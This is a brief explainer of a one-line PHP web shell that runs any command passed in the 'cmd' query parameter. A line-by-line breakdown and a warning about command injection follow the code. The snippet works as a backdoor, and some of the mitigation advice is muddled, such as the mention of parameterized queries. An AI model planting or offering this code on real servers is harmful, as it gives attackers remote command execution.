<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>

>>>

<?php: This is the opening PHP tag, indicating the start of PHP code.

echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>";: This is the PHP code responsible for executing shell commands and displaying the output within an HTML <pre> (preformatted text) element.

echo: This PHP function is used to output text.

"<pre>": This is an HTML tag used for preformatted text. It is placed before and after the output to preserve formatting, such as line breaks.

.: The dot operator is used for string concatenation in PHP, combining the parts into a single string.

shell_exec($_GET["cmd"]): This part uses the shell_exec function to execute shell commands. The command to be executed is retrieved from the query parameter named "cmd" using $_GET["cmd"]. This is a potential security risk as it allows arbitrary shell commands to be executed based on user input.

"</pre>": This HTML tag closes the preformatted text block.

?>: This is the closing PHP tag, indicating the end of PHP code.

Explanation:

The script takes a shell command as a parameter from the query string ($_GET["cmd"]), executes it using shell_exec, and then echoes the output within <pre> tags. The use of <pre> ensures that the output is displayed in a preformatted manner, maintaining line breaks and whitespace.
Security Implications:

Allowing user input directly into shell commands, especially without proper validation and sanitization, is extremely risky and can lead to security vulnerabilities, such as command injection. It is crucial to validate and sanitize user input before using it in shell commands to prevent malicious commands.

This script poses a serious security risk and should not be used in a production environment without proper security measures. If deployed on a web server, it can be exploited by attackers to execute arbitrary commands on the server, leading to unauthorized access and potential compromise.

A safer alternative is to use proper input validation, sanitization, and parameterized queries if executing shell commands based on user input is necessary. Additionally, consider implementing access controls and restrictions to limit the impact of potential security vulnerabilities.
